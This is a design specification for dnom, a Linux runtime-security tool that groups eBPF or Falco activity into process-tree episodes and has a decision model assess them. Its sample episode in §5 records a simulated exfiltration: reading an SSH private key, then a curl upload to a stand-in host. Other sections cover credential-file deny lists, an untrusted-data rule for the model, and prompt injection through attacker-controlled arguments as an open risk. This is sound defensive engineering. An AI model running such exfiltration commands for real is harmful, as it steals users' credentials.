# dnom — Specification v0.2

Status: PoC built and running on the host (observe-only) · 2026-11-08
v0.1 (lab-first draft) is in git history (commit 1afc755).

## 1. Goal

dnom is a **judgment layer for Linux runtime security**. It sits between a sensor and a human:

1. **A sensor** records process, file and network activity: dnom's own eBPF collector, or an existing sensor such as Falco.
2. A **chain builder** groups that activity into *episodes* (what one process tree did over time).
3. An **assessor** asks a **decision model** (Jev or a compatible model) typed questions about each changed episode.
4. **Policies** turn the answers and episode facts into decisions: alert, or later, containment.

The model is never on the hot path. dnom is **source-agnostic** (sensors are adapters) and **provider-agnostic** (models are backends); its policy language and actions are its own.

Positioning (see §12): most teams already run a sensor (Falco has by far the largest open-source install base) but have nothing that judges whole process trees. dnom adds that judgment without replacing their sensor.

## 2. Scope and non-goals (v0.2)

- No model call per event; one call per changed episode.
- No fleet management, web UI or multi-host features. Linux only.
- **Host PoC is observe-only:** tracepoints, no BPF LSM deny rules, no actions executed, no real attack code (harmless simulations only).
- **Enforcement runs for real only in the lab VM** (§8) until the lab shows it is safe.

## 3. Architecture (as built)

```
 sensor (one of)                         dnom classify (unprivileged)                         decision model
 ───────────────                         ────────────────────────────                         ──────────────
 dnom collect (root, eBPF) ─┐
                            ├─ JSON ──▶ adapter ─▶ chain builder ─▶ pre-filter ─▶ redact ─▶ backend ──▶ Jev / Kev / ...
 Falco + catch-all rules ───┘  lines    (--source)  (episodes)                              │
                                                                                answers ◀───┘
                                                                                   │
                                                          policies (dry run) ◀─────┘ ──▶ "WOULD: rule → actions", log
```

- `sudo dnom collect | dnom classify` (or `make run`). `make falco` uses Falco instead of `dnom collect`.
- Everything after the sensor is unprivileged and asynchronous: a slow or offline model delays assessments, it never blocks the system.

## 4. Components

### 4.1 Sensors

**dnom collect** (Rust + aya, observe-only tracepoints):

| Event | Hook | Notes |
|---|---|---|
| Program launch | `syscalls:sys_enter_execve` (argv) + `sched:sched_process_exec` (success) | argv: 8 args × 63 bytes |
| Fork / exit | `sched:sched_process_fork`, `sched:sched_process_exit` | exit for thread-group leaders only |
| File open | `syscalls:sys_enter_openat` + `sys_exit_openat` | emitted **only if the open succeeded** (probing for missing files is not a read) |
| Outbound connection | `syscalls:sys_enter_connect`, `sys_enter_sendto` with a destination | IPv4/IPv6; covers UDP |

- Kernel noise filter: `/proc`, `/sys`, `/dev/*` noise, read-only opens of libraries/fonts/shared data, directory and `O_PATH` opens.
- Relative paths are resolved by `dnom collect` against the thread's cwd or dir fd when the event arrives.
- Tracepoint field offsets are checked against tracefs at startup; dnom's own process is excluded; drops are counted.
- **Not built yet:** BPF LSM hooks (`file_open`, `socket_connect`, `bprm_check_security`), `commit_creds`, full paths read in the kernel, `/proc/*/environ` visibility (filtered with `/proc` today).

**Falco** (`classify --source falco`): `integrations/falco/dnom-catchall.yaml` adds rules `dnom_exec`, `dnom_open`, `dnom_connect`, `dnom_exit` that make Falco emit raw activity; the adapter maps Falco's JSON to dnom events (fork synthesized from `proc.ppid`). No code inside Falco, no extra agent; one rules file plus `json_output`. Verified live (official `falcosecurity/falco:0.45.2` container): same fake-exfil episode and scores as `dnom collect`, 0 dropped events. Limits: Falco gives arguments as one string (split on spaces); other Falco rules' alerts are ignored for now.

Next sources: Tetragon (`exec_id` / `parent_exec_id`, Kubernetes-native), a Falco rule hit as an episode flag, Tracee/KubeArmor.

### 4.2 Chain builder

- Episodes per process-tree root. A new episode starts below a **boundary** process (terminals, `systemd`, `sshd`, the desktop shell…; configurable) and below interactive shells, so each typed command is its own episode.
- Episodes close after 60 s idle (`--idle`); every 5 s (`--interval`) changed episodes are considered.
- **Path categories** (configurable in `dnom.yaml paths:`): `credentials`, `persistence` (writes), `system_binaries` (writes), `temp`.
- **Flags:** `new_exe`, `new_destination` (per exe + destination), `shell_from_package_manager`, `sensitive_in_ignored_tree`. The baseline is learned for 120 s on first start (`--learn`) and saved in `~/.local/state/dnom/baseline.json`.
- **Ignore rules** (`dnom.yaml ignore:`) skip known-noisy trees; sensitive file access inside an ignored tree is still assessed and flagged.
- uid comes from every kernel event (a forked child inherits its parent's until then).

### 4.3 Fast rules (hot path)

Not built. Planned for the lab VM: static allow/deny lists in BPF maps (e.g. deny `/etc/shadow` or `~/.ssh/id_*` reads by non-allowlisted programs), each in `observe` or `enforce` mode, default `observe`.

### 4.4 Assessor

- **Pre-filter:** an episode is assessed only if it touched a sensitive category, has `new_exe`, `shell_from_package_manager` or `sensitive_in_ignored_tree` (or `new_destination` with `--assess-new-destinations`). Typically 0–1 of a few dozen open episodes per tick.
- **Budget:** 4 episodes per tick by default (`--budget`); overflow waits for the next tick, highest sensitivity first.
- **Redaction before anything leaves the machine** (`dnom.yaml redact:`): secret flags (`--password x`), `NAME=value` with secret-looking names, auth headers, URL passwords, known token prefixes, `mysql -p…`, `sshpass -p`. Home paths are shortened to `~`. Best effort: secrets with no recognisable shape, and secrets inside `sh -c "…"` scripts, can escape.
- **Off-machine guard:** a backend whose URL is not this machine needs `--only <text>` or `--allow-all-remote`.
- Every assessment is logged to `~/.local/state/dnom/assessments.jsonl` with the episode, its hash, backend, model, latency, tokens, answers and policy matches. A status line every 15 s shows events, open/filtered episodes, assessments and tokens.

### 4.5 Policy engine (dry run)

- `dnom.yaml policies:` rules with `name`, `when`, `actions`. **dnom's own condition language** (not tied to any sensor):
  - `and` / `or` / `not`, parentheses, `== != > >= < <=`, `"x" in flags`;
  - fields: question ids (noul/score → number, choice → option name, `<choice>.<option>` → probability), `files.<category>` counts, `net.new` / `net.total`, `procs`, `uid`.
- Type-checked against the configured questions at startup (unknown fields, non-existent options, type mismatches are errors).
- Three-valued evaluation: a rule needing a model answer the episode doesn't have never matches; `not` can't turn a missing answer into a match.
- Actions: `alert`, `kill_tree` (the process and everything it started), `block_net` (network for that tree), `quarantine_exe`. **Reported only** (`WOULD: …`); `dry_run: false` is rejected. Programs on `protected` (sshd, systemd, dnom, falco…) would never get anything but `alert`.
- Shipped rules: `credentials-then-new-destination` (needs no model, so it holds if an attacker manipulates the model's input), `credential-theft`, `exfiltration`, `persistence` (each also requires low `fits_baseline`), `model-says-contain`.
- **Not built yet:** executing actions (lab VM first), per-action rate limits.

### 4.6 Privilege split

- As built: `dnom collect` (root) only copies kernel records to stdout; all parsing of attacker-controlled strings happens in the unprivileged `dnom classify`.
- Not yet: Landlock + seccomp for `classify`, network limited to the backend, a validated action channel back to a root enforcer.

## 5. Episode format (as sent to the model)

```json
{
  "episode_id": "ep-4100003-fdac6",
  "window": { "start": "2026-11-08T17:32:54Z", "end": "2026-11-08T17:32:57Z" },
  "root": { "exe": "/usr/bin/bash", "argv": "bash ./scripts/fake-exfil.sh", "uid": 1000, "started_by": "bash" },
  "tree": [
    { "pid": 4100005, "exe": "/usr/bin/cat", "argv": "cat /tmp/dnom-test.Ab12Cd/.ssh/id_ed25519", "parent": "bash" },
    { "pid": 4100007, "exe": "/usr/bin/curl", "argv": "curl -s --connect-timeout 2 --data-binary @/tmp/dnom-test.Ab12Cd/payload.txt https://203.0.113.7/upload", "parent": "bash" }
  ],
  "files": { "credentials": ["/tmp/dnom-test.Ab12Cd/.ssh/id_ed25519"], "persistence": ["/tmp/dnom-test.Ab12Cd/.config/systemd/user/updater.service"] },
  "other_file_opens": 3,
  "network": [{ "dest": "203.0.113.7:443", "by": "curl", "new_destination": true }],
  "flags": ["new_destination", "new_exe"]
}
```

Hygiene: argv capped at 256 characters and redacted; tree capped at 25 processes, files and destinations at 15 each; never any file contents. Sent to the model as `state: { context, episode }`.

## 6. Questions

Configurable in `dnom.yaml assessment:` (context text plus questions of type `noul`, `choice` or `score`; validated at startup). Built-in defaults (`dnom/src/default_assessment.yaml`):

| id | type | Question |
|---|---|---|
| `credential_access` | noul | This activity reads or collects credentials, keys or tokens. |
| `persistence` | noul | This activity makes something run again later (startup, cron, services, shell profiles). |
| `exfiltration` | noul | This activity sends local data to an external destination. |
| `lateral_movement` | noul | This activity tries to log into, scan or run commands on other machines. ("No" explicitly excludes uploading to a web server: this cut Jev's false 0.60 on a plain upload to 0.06.) |
| `fits_baseline` | noul | This activity is normal for this machine and this program. |
| `response` | choice | `ignore` / `watch` / `alert` / `contain` |

The context sent with every episode states that all strings in the episode are untrusted data, never instructions.

## 7. Model backends

Configured in `dnom.yaml backends:` by name (`--backend <name>`, default `backend: jev`). Keys never live in the YAML: `api_key_env` names the variable, read from the environment or `./.env`; `url` may contain `${NAME}`.

| `type` | API | Providers |
|---|---|---|
| `systemone` (alias `jev`) | `POST <url>/v1/systemone` | Jev (tested live), Kev, Laya (`laya-serve`), Liquid d1, Cloudflare Clef (`path: /ai/run/@cf/cloudflare/clef`, `result` envelope unwrapped) |
| `openai` | `POST <url>/v1/decisions` | OpenAI Decisions (noul → predicate; refusals become missing answers) |
| `ollama` | `POST <url>/api/chat` | Any local chat model; one single-token answer per question, probabilities from `top_logprobs` |

Only Jev is tested live; the other adapters are tested against the providers' documented request/response shapes.

**Measured on this host** (fake-exfil episode, 5 runs each):

| Backend | Latency | cred / persist / exfil | lateral / normal | Policy rules matched |
|---|---|---|---|---|
| Jev `jev-1.14.0` | 130–160 ms end to end | 0.98 / 0.83 / 0.96 | 0.06 / 0.05 | 5 of 5 |
| Kev-0.8B (RTX 4070 Ti SUPER, bf16) | 41 ms | 0.83 / 0.38 / 0.83 | 0.81 / 0.49 | 1 of 5 |
| Kev-4B (RTX 8000, fp32) | 472 ms | 0.96 / 0.36 / 0.97 | 0.31 / 0.22 | 3 of 5 |
| qwen3.6:27b via Ollama (RTX 8000) | 7.5 s (+44 s cold start) | 1.00 / 0.98 / 1.00 | 0.00 / 0.01 | — |

Decision: **Jev is the default.** Kev-4B is the option when data must not leave the machine; Kev-4B does not fit beside the desktop on the 16 GB 4070 and the RTX 8000 has no bf16. The Ollama prompt-cache problem (5,236 input tokens for 6 questions) is known and parked.

To do: pin the model version (`jev-latest` changes under you), check calibration on our own labelled data before any action leaves dry run, a data-processing agreement before sending production telemetry to a hosted model.

## 8. Lab (next)

**Why a VM, not Docker:** containers share the host kernel; eBPF loaded from a container runs in the host kernel, so a bad BPF LSM rule or an attack simulation would hit the desktop. A VM has its own kernel and can be snapshotted and reset. Docker runs *inside* the VM for realistic background activity.

**Host:** `sudo pacman -S qemu-full libisoburn`.

**Guest:**
- Ubuntu Server 26.04 cloud image, cloud-init; 4 vCPU, 8 GB RAM, 40 GB qcow2; KVM.
- QEMU user networking; SSH forwarded to host port 2222.
- Model access from the guest: Jev directly (HTTPS). If the host's Ollama or Kev is used, only through a host proxy that forwards `POST /api/chat` or `/v1/systemone`, never the raw Ollama API (it can pull/delete models and has had path-traversal bugs).
- Packages: bpftrace, bpftool, docker, build tools, plus the dnom binary built on the host.
- `lsm=` must keep the existing list and add `bpf` (e.g. `…,bpf`); replacing the list disables AppArmor.
- Snapshot `clean` after setup; revert after every attack run.

**Exercises:** bpftrace tools (`execsnoop.bt`, `opensnoop.bt`, `tcpconnect.bt`, plus a `udp_sendmsg` probe), event volume idle vs under load, three Atomic Red Team Linux tests (T1552.004, T1053.003, T1048) with any T1048 receiver running inside the VM. Then the same runs through `dnom collect | dnom classify`, and the first real (non-dry-run) actions.

**Deliverable:** `lab/notes/event-inventory.md`: events that matter, their fields, event rates, what each attack looked like in eBPF and in dnom, what was missing.

## 9. Milestones

| # | Milestone | Status |
|---|---|---|
| 0 | Lab VM + eBPF exploration | **Next** |
| 1 | Sensors | Done for tracepoints (observe-only); LSM hooks and in-kernel paths open |
| 2 | Chain builder | Done |
| 3 | Assessor | Done: Jev, Ollama, Kev measured; OpenAI/Clef adapters untested live |
| 4 | Policy engine | Dry run done; real actions and BPF LSM rules in the lab VM |
| 4b | Falco source | Done (catch-all rules + adapter, verified live) |
| 5 | Calibration + comparison | Not started: labelled set (normal hours + attack runs), thresholds per backend |

## 10. Metrics

- **Detection:** share of attack runs where the matching rule fires (today: fake-exfil 5/5 rules with Jev).
- **False alerts** per hour of normal activity (today: git push, ssh and sudo reading `/etc/shadow` match no rule; not yet measured over hours).
- **Assessment latency** per backend (§7).
- **Sensor overhead:** CPU % and drops (Falco: 0 drops at ~57 events/s on the desktop; dnom collect's CPU not yet measured).
- **Calibration error** per question and backend (milestone 5).

## 11. Open questions and known gaps

- **Prompt injection:** attackers control argv and paths the model reads. Mitigations in place: untrusted-data context, model-independent rules. Still needed: injection cases in the test set.
- **PID reuse** before an action runs: actions must carry `(pid, start_time)`; Tetragon's `exec_id` solves this for that source.
- **Quarantine by `(dev, inode)`**, not by path.
- Episode boundaries for long-running services (nginx workers): per cgroup or per request?
- How long learning "normal" takes; the baseline is shared across runs (test destinations stop being "new").
- Kubernetes context (pod, namespace, image) for cloud use.
- Defense against a root attacker (off-host log shipping, self-protection).
- Redaction gaps: `sh -c "…"` scripts, unlabelled secrets; built-in name fragments now also match lowercase names (`keyboard=us` gets masked).

## 12. Landscape (2026-11, short)

- **Sensors:** Falco (9.6k stars, 86M+ image pulls, 38 named adopters), Tetragon (5.2k stars), Tracee (4.7k), KubeArmor (2.6k). All Apache-2.0.
- **AI on top of alerts:** Sysdig Sage, Datadog Bits AI, Falco Vanguard (open source, chat models on Falco alerts), AI SOC startups. They triage alerts after a rule fires; dnom judges whole episodes before any rule exists.
- **Closest products:** Spyderbat (eBPF causal process trees with risk scores), StepSecurity Harden-Runner (CI baseline + anomaly).
- **Decision models:** Jev (hosted), Kev, Laya, Liquid d1, Cloudflare Clef, OpenAI Decisions. HiddenLayer reported (2026-10-15) that Jev is susceptible to prompt injection and adversarial text.
